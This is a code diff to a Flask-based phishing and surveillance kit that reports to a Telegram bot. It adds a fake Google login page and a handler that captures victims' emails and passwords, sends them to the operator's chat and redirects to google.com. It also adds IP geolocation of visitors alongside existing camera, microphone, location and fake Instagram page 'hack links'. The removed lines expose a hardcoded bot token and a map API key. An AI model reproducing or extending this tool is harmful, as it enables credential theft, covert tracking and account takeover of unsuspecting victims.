@@ -14,19 +14,28 @@ import asyncio
 import colorama
 import random
 import string
+from dotenv import load_dotenv, dotenv_values 
 
 app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')
 app.secret_key = 'xxx'
 
 
+load_dotenv() 
 
-BOT_KEY = "7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8"
+BOT_KEY = os.getenv("MY_BOT_KEY")
+user_id = os.getenv("USER_ID")
+
+print('BOT KEY : ', BOT_KEY)
+print('USER ID IF CHANNEL ID : ', user_id)
+
+
+
+
+
 
 bot = telebot.TeleBot(BOT_KEY)
 
 
-
-user_id = "@hackermain"
 
 
 #user_id = 1853412532
@@ -51,7 +60,13 @@ info = f"""*‼️ Hack Link List:*
 
 {host}/mic - Microphone Hack
 
-*{host}/instagram-login-page - Instagram Fake Login Page*
+*CLONE WEBPAGES *
+  for phishing website list 
+
+
+*{host}/google-login - GOOGLE LOGIN FAKE PAGE  *
+
+*{host}/instagram-login-page - INSTAGRAM FAKE PAGE *
 """
 
 
@@ -63,7 +78,11 @@ def message(message):
     except Exception as e:
             print(f"Failed to send message to {user_id}: {str(e)}")
             
-            
+ 
+def ipdata(ip):
+    data = requests.get(f"http://ip-api.com/json/{ip}?status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")
+    return data.json()
+           
             
 def USERS():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr) 
@@ -72,7 +91,9 @@ def USERS():
     data = request.accept_mimetypes
     endcode = request.accept_encodings
     chaer = request.accept_charsets
-    messages = f'\nIP : {ip} \n USERINFO : {user} \n LANDUAGES : {lang} \n MINIETYPRS : {data} \n CHARSETS : {chaer} \n ENCODEING : {endcode} \n'
+    ipinfo = ipdata(ip)
+    ipmessage = f"ip infomesion ```{ipinfo}``` "
+    messages = f'\nIP : {ip} {ipmessage} \n USERINFO : {user} \n LANDUAGES : {lang} \n MINIETYPRS : {data} \n CHARSETS : {chaer} \n ENCODEING : {endcode} \n'
     message(messages)
     return  None
 
@@ -92,15 +113,11 @@ def fix_base64_padding(base64_string):
 
 
 
-#message(info)
+message(info)
 
        
 
 
-
-def ipdata(ip):
-    data = requests.get(f"http://ip-api.com/json/{ip}?status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")
-    return data.json()
 
 
 
@@ -158,8 +175,9 @@ def loc():
 
 @app.route("/video")
 def video_hack():
-    USER = USERS()
+    
     message("video hack page opened !? \n")
+    USER = USERS()
     return render_template("video_hack.html")
 
 @app.route("/mic")
@@ -173,6 +191,35 @@ def insta():
     USER = USERS()
     message("instagram fake webpage  page opened !? \n")
     return render_template("insta/index.html")
+
+
+@app.route("/google-login")
+def google():
+    USER = USERS()
+    message("google fake webpage  page opened !? \n")
+    return render_template("google/CHECK.html")
+
+
+
+@app.route("/google-get-data", methods=['POST', 'GET'])
+def google_data():
+       USER = USERS()
+       message("google resiveing  page opened !? \n")
+   
+       user_name = request.form.get("email")  
+       user_pass = request.form.get("password")  
+       user_data = f"""📌 GOOGLE-LOGIN\n
+    YOUR TREGET INFOMESION 
+    \n
+    * EMAIL : {user_name}*
+    * PASSWORD : {user_pass}*
+      
+    (●'◡'●) WAIT FOR PAASWORD 
+    \n"""
+       message(user_data)
+       
+       print(user_name)
+       return redirect("https://www.google.com")
 
 
 
@@ -247,7 +294,6 @@ GOOOGLE MAP LINK : https://www.google.com/maps/@{lat},{lon}
     finally:
           time.sleep(20)
           bot.send_location(user_id, latitude=jloc['latitude'], longitude=jloc['longitude'], heading=jloc['heading'], horizontal_accuracy=jloc['accuracy'] )
-    # photo(f"https://maps.geoapify.com/v1/staticmap?style=toner-grey&width=350&height=300&center=lonlat:{jloc['longitude']},{jloc['latitude']}&zoom=10.9318&apiKey=83201a4a9e1e477399fe95ceb2f855e9")
           return jsonify({"message": "done"})
       
       
